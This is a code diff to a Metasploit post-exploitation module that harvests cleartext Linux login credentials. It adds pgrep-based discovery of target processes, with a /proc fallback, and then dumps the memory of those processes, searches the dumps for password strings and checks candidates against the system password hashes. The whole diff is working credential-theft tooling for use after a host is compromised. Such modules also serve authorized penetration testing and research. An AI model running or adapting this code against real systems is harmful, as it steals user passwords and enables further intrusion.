@@ -72,18 +72,43 @@ class MetasploitModule < Msf::Post
   end
 
   #
-  # Get pid and cmdline for all running processes
+  # Get pid and cmdline for useful processes using pgrep
   #
-  def get_processes
+  def get_processes_pgrep
     processes = []
 
+    PROCESSES.each do |p|
+      p[:cmdline].each do |cmdline|
+        cmd_exec("pgrep -f #{cmdline}").to_s.split("\n").map {|p| p.strip }.select {|p| p =~ /\A\d+\z/ }.each do |pid|
+          processes << { pid: pid, cmdline: cmdline }
+        end
+      end
+    end
+
+    processes
+  end
+
+  #
+  # Get pid and cmdline for all running processes using /proc/**/cmdline
+  #
+  def get_processes_proc
+    processes = []
     cmd_exec('ls /proc').each_line.map { |pid| pid.to_s.chomp }.each do |pid|
       next unless pid =~ /\A\d+\z/
       cmdline = read_file "/proc/#{pid}/cmdline" || ''
       processes << { pid: pid, cmdline: cmdline.to_s }
     end
 
-    processes
+    r = []
+    PROCESSES.each do |process|
+      process[:cmdline].each do |cmdline|
+        processes.select { |p| p[:cmdline].match(cmdline) }.each do |process|
+          r << process
+        end
+      end
+    end
+
+    r
   end
 
   #
@@ -152,11 +177,10 @@ class MetasploitModule < Msf::Post
   end
 
   #
-  # Find processes matching +process_names+
-  # find process ID (pid) for each process,
-  # dump pid memory to dumpfile on filesystem,
+  # for each useful process,
+  # dump process memory to dumpfile on filesystem,
   # search the dumpfile for +match_strings+,
-  # and return needle and surrounding strings.
+  # and return needle and surrounding (+/- 10) strings.
   #
   def search_mem(process_names, match_strings)
     potential_passwords = []
@@ -165,7 +189,8 @@ class MetasploitModule < Msf::Post
     process_names.each do |process_name|
       @processes.select { |p| p[:cmdline].match(process_name) }.each do |process|
         pid = process[:pid]
-        vprint_status "Found PID matching #{process_name}: #{process[:pid]}"
+
+        vprint_status "Searching #{process_name} (PID: #{process[:pid]}) ..."
 
         unless dump_mem(pid, dumpfile)
           print_error "Error creating dump file for #{process_name} (#{pid})"
@@ -221,16 +246,21 @@ class MetasploitModule < Msf::Post
     vprint_status "Found password hashes for #{@hashes.size} users"
 
     vprint_status 'Retrieving process list...'
-    @processes = get_processes
-    if @processes.empty?
-      fail_with Failure::Unknown, 'Found no running processes'
+    @processes = []
+    if command_exists? 'pgrep'
+      @processes = get_processes_pgrep
+    else
+      @processes = get_processes_proc
     end
-    vprint_status "Found #{@processes.size} running processes"
+    if @processes.empty?
+      fail_with Failure::Unknown, 'Found no useful processes'
+    end
+    vprint_status "Found #{@processes.size} useful processes"
 
     creds = []
     PROCESSES.each do |p|
       app = p[:app]
-      search_mem(p[:cmdline], p[:needles]).each do |password|
+      search_mem(p[:cmdline], p[:needles]).uniq.each do |password|
         check_valid_password(password).each do |user|
           vprint_good "[#{app}] Found credentials: #{user}:#{password}"
           creds << [app, user, password]
@@ -243,6 +273,8 @@ class MetasploitModule < Msf::Post
       print_status 'Found no credentials'
       return
     end
+
+    creds.uniq!
 
     vprint_good "Found #{creds.size} credentials"
     table = Rex::Text::Table.new(
